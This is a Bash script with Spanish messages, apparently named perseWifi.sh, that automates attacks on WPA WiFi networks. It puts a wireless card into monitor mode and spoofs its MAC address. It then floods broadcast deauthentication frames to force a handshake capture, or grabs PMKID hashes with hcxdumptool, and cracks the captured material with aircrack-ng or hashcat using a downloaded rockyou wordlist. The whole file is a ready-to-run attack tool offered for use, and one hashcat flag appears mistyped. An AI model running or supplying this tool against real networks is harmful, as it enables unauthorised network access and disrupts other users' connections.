#!/bin/bash

#Variables
wordlist="/usr/share/wordlists/rockyou.txt"
wordistDIR=$(dirname $wordlist)


export DEBIAN_FRONTEND=noninteractive

#Colours
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function echoColor(){
	color=$1
	message=$2
  args=$3

	case $color in
  
  green)  echo $args -e "${green}${message}${end}";;
	red) 		echo $args -e "${red}${message}${end}";;
	blue) 		echo $args -e "${blue}${message}${end}";;
	yellow) 	echo $args -e "${yellow}${message}${end}";;
	purple) 	echo $args -e "${purple}${message}${end}";;
	turquoise) 	echo $args -e "${turquoise}${message}${end}";;
	gray) 		echo $args -e "${gray}${message}${end}";;

	esac
}

trap ctrl_c SIGINT # or INT

function ctrl_c (){
	echoColor "red" "\n[*] Saliendo..."
  airmon-ng stop ${networkCard}mon > /dev/null 2>&1
  tput cnorm;service networking restart 
  rm captura* 2>/dev/null 
  exit 0
}

function helpPanel(){
	echoColor "gray" "\n[*] Uso: ./perseWifi.sh\n"
  echoColor "red" "\ta) Modos de ataque"
  echoColor "red" "\t\t HandShake"
  echoColor "red" "\t\t PKMID"
  echoColor "blue" "\tn) Nombre de la tarjeta de red"

  exit 0
}

function dependencies(){
  tput civis
  clear; dependencies=("aircrack-ng" "macchanger" "wget")
  
  echoColor "yellow" "\n[*] Comprobando dependencias..."
  sleep 2
  
  for program in "${dependencies[@]}"; do
    echoColor "yellow" "[*] Herramienta $program " "-n"
    
    test -f /usr/bin/$program 

    if [[ "$(echo $?)" == "0" ]]; then 
      echoColor "green" "(V)"
    else
      echoColor "red" "(X)"
      echoColor "yellow" "[*] Instalando la herramienta $program ..."
      apt install $program -y > /dev/null 2>&1
    fi 

    sleep 1
  done
}

function startAttack(){
  
  modeMonitor_Macchanger
  
  if [[ "$(echo $attack_mode)" == "HandShake" ]]; then 

    xterm -hold -e "airodump-ng ${networkCard}mon" &
    airodump_xterm_PID=$!

    tput cnorm
    echoColor "gray" "\n[*] Nombre del punto de acceso (BSSID): " "-n" && read apName
    echoColor "gray" "\n[*] Canal del punto de acceso: " "-n" && read apChannel
  
    kill -9 ${airodump_xterm_PID}
    wait $airodump_xterm_PID 2>/dev/null
  
    xterm -hold -e "airodump-ng -c ${apChannel} -w captura --essid ${apName} ${networkCard}mon" &
    airodump_filter_sterm_PID=$!

    sleep 3;xterm -hold -e "aireplay-ng -0 10 -e ${apName} -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
    aireplay_xterm_PID=$!
    sleep 10; kill -9 ${aireplay_xterm_PID}; wait $aireplay_xterm_PID 2>/dev/null
  
    sleep 10; kill -9 ${airodump_filter_sterm_PID}; wait $airodump_filter_sterm_PID 2>/dev/null

    checkRockyou
    
    echoColor "blue" "\n[NOTA] La captura actual debe removerse de este directorio, despues de terminar con la fuerza bruta para no afectar el flujo del script."
    xterm -hold -e "aircrack-ng -w ${dicc} captura-01.cap" & 

  elif [[ "$(echo $attack_mode)" == "PKMID" ]]; then 
    clear; echoColor "yellow" "\n[*] Iniciando ClientLess PKMID Attack (40s)..."
    timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o capturaPKMID"

    echoColor "yellow" "[*] Obteniendo Hashes..."
    hcxpcapngtool --pmkid=myHashes capturaPKMID; rm capturaPKMID 2>/dev/null
    test -f myHashes

    if [[ "$(echo $?)" == "0" ]]; then
      checkRockyou 

      echoColor "red" "[*] Iniciando proceso de fuerza bruta...\n"
      hashcat -n 16800 $dicc myHashes -d 1 --force
    else
      echoColor "red" "[!] No se a podido capturar el paquete nesesario..."
      rm captura* 2>/dev/null
      sleep 1
    fi

  else
    echoColor "red" "[!] Este modo de ataque no es valido"
  fi
}

function checkRockyou(){
 echoColor "gray" "\n[!] Deseas utilizar el diccionario por defecto (rockyou.txt)? (s/n): " "-n" && read response
    if [[ "$(echo $response)" == "s" ]]; then

      if [[ ! -f $wordlist ]]; then
        echoColor "yellow" "\n[!] No existe el diccionario (Descargando)..."

        if [[ ! -d $wordistDIR ]]; then
          echoColor "yellow" "\n[*] No existe el directorio (Creando)..."
          mkdir -p $wordistDIR
        fi

        echoColor "yellow" "\n[*] Descargando diccionario rockyou.txt (134M)..."
        wget -q -O $wordlist -N -nd 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
        sleep 1; 
      fi

      dicc=$wordlist
    else
      echoColor "gray" "\n[*] Directorio del diccionario: " "-n" && read dicc
    fi 
}

function modeMonitor_Macchanger(){
  clear
  echoColor "gray" "[*] Configurando tarjeta de red..."

  airmon-ng start $networkCard > /dev/null 2>&1
  airmon-ng check kill > /dev/null 2>&1

  ifconfig ${networkCard}mon down && macchanger -r ${networkCard}mon > /dev/null 2>&1
  ifconfig ${networkCard}mon up

  echoColor "gray" "[*] Nueva direccion MAC assiganda ${yellow}$(macchanger -s ${networkCard}mon | grep "Current" | xargs | cut -d ' ' -f '3-100')${end}"
}


# Main function

if [[ "$(id -u)" == "0" ]]; then #requiere acciones administrativas

	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do

		case $arg in 

		a) attack_mode=$OPTARG; let parameter_counter++; ;;
		n) networkCard=$OPTARG; let parameter_counter++; ;;
		h) helpPanel ;;

		esac

	done

	if [[ $parameter_counter -ne 2 ]]; then #require los a y n para usar la herramienta
		helpPanel
	else
    dependencies
		startAttack
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1;service networking restart 
	fi

else
	echoColor "yellow" "\n[!] Es neseario ser root."
fi















